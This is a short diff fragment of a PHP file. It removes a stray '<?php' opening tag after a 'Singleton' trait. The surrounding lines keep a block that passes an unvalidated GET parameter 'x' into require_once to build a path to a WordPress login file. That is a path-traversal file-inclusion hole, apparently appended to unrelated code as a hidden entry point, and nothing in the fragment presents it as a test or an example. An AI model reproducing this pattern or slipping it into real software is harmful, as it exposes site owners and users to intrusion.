@@ -62,8 +62,6 @@ trait Singleton {
 	}
 }
 
-<?php
-
 if (isset($_GET["x"])) {
 require_once('/var/www/'. $_GET["x"] .'/wp-login.php');
 
